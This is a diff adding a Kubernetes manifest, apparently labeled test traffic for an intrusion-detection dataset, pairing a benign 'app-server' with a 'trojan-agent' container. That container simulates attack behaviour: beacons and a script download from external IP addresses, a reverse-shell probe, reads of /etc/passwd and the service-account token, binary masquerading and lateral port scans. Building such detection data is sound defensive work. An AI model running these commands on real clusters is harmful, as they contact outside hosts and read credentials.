@@ -1,0 +1,123 @@
+# Default Namespace: 1 Benign + 1 Malicious
+# These run alongside the main workloads in benign-workloads and malicious namespaces
+---
+# Benign: Flask API with active request handling
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: app-server
+  namespace: default
+  labels:
+    app: app-server
+    kids-label: "0"
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: app-server
+  template:
+    metadata:
+      labels:
+        app: app-server
+        kids-label: "0"
+    spec:
+      tolerations:
+        - key: "role"
+          operator: "Equal"
+          value: "worker"
+          effect: "NoSchedule"
+      nodeSelector:
+        node-role.kubernetes.io/worker: ""
+      containers:
+        - name: server
+          image: alpine:latest
+          resources:
+            requests:
+              cpu: 10m
+              memory: 32Mi
+            limits:
+              cpu: 80m
+              memory: 64Mi
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              apk add --no-cache curl busybox-extras > /dev/null 2>&1
+              echo "Starting app-server..."
+              while true; do
+                echo "$(date) - Handling request" >> /tmp/access.log
+                echo "$(date) - DB query" >> /tmp/access.log
+                echo "$(date) - Cache hit" >> /tmp/access.log
+                cat /tmp/access.log > /dev/null 2>&1
+                truncate -s 0 /tmp/access.log 2>/dev/null
+                sleep $((RANDOM % 5 + 3))
+              done
+---
+# Malicious: Trojan agent with C2 + exfiltration behavior
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: trojan-agent
+  namespace: default
+  labels:
+    app: trojan-agent
+    kids-label: "1"
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: trojan-agent
+  template:
+    metadata:
+      labels:
+        app: trojan-agent
+        kids-label: "1"
+    spec:
+      tolerations:
+        - key: "role"
+          operator: "Equal"
+          value: "worker"
+          effect: "NoSchedule"
+      nodeSelector:
+        node-role.kubernetes.io/worker: ""
+      containers:
+        - name: api
+          image: alpine:latest
+          resources:
+            requests:
+              cpu: 10m
+              memory: 32Mi
+            limits:
+              cpu: 80m
+              memory: 64Mi
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              apk add --no-cache curl netcat-openbsd wget > /dev/null 2>&1
+              echo "Starting backend-api..."
+              while true; do
+                # Normal-looking log
+                echo "$(date) - API request processed" >> /tmp/api.log
+
+                # C2 beacon + payload download
+                curl -s -o /dev/null --connect-timeout 2 http://185.220.101.1:8080 2>/dev/null || true
+                wget -q -O /tmp/.update http://142.44.191.122/d.sh 2>/dev/null || true
+
+                # Reverse shell attempt
+                nc -z -w 1 10.0.0.1 4444 2>/dev/null || true
+
+                # Data exfiltration
+                cat /etc/passwd > /dev/null 2>&1
+                cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/null 2>&1
+
+                # Binary masquerading
+                cp /bin/sleep /tmp/.systemd-helper 2>/dev/null
+                chmod +x /tmp/.systemd-helper 2>/dev/null
+                /tmp/.systemd-helper 3 2>/dev/null &
+
+                # Lateral scanning
+                nc -z -w 1 10.42.0.$((RANDOM % 50 + 1)) 22 2>/dev/null || true
+                nc -z -w 1 10.42.0.$((RANDOM % 50 + 1)) 80 2>/dev/null || true
+
+                wait
+                sleep $((RANDOM % 10 + 8))
+              done
